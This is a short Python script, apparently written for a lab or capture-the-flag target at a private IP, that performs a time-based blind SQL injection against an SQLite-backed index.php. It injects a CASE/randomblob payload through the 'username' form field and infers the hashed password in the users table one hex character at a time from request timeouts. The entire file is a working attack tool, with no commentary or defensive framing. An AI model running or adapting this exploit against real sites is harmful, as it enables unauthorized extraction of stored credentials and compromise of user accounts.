#!/usr/bin/python3
#Imports
from requests import Request, Session
import requests
import sys

if(len(sys.argv) != 2):
    print("Usage: " + sys.argv[0] + " http://url")
    exit()

url_o = sys.argv[1]

#Conection test
try:
    requests.get(url_o)
except:
    exit()

#alfabeto hex
alf_hex = ['a','b','c','d','e','f','1','2','3','4','5','6','7','8','9','0']

#Array index & char position
i = 0
p = 1

result = []
print("Running SQLite Injection...")

#Exploitation
while i < 16:
    url = url_o + "/index.php"
    headers = {"Cache-Control": "max-age=0", "Upgrade-Insecure-Requests": "1", "Origin": "http://192.168.0.108:8989", "Content-Type": "application/x-www-form-urlencoded", "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.105 Safari/537.36", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9", "Referer": "http://192.168.0.108:8989/", "Accept-Encoding": "gzip, deflate", "Accept-Language": "pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7", "Connection": "close"}
    data = {"username": "\"||(SELECT CASE(substr((SELECT pass from users)," + str(p) + ",1)) WHEN \"" + alf_hex[i] + "\" THEN randomblob(999999999)  ELSE randomblob(9999) END)||\"", "content": "newooo", "newcomment": "1"}
    s = Session()
    preped = Request('POST', url, headers=headers, data=data).prepare()

    try:
        s.send(preped, timeout=4)
        i += 1
    except:
        result.append(alf_hex[i])
        i = 0
        p += 1
print(''.join(result))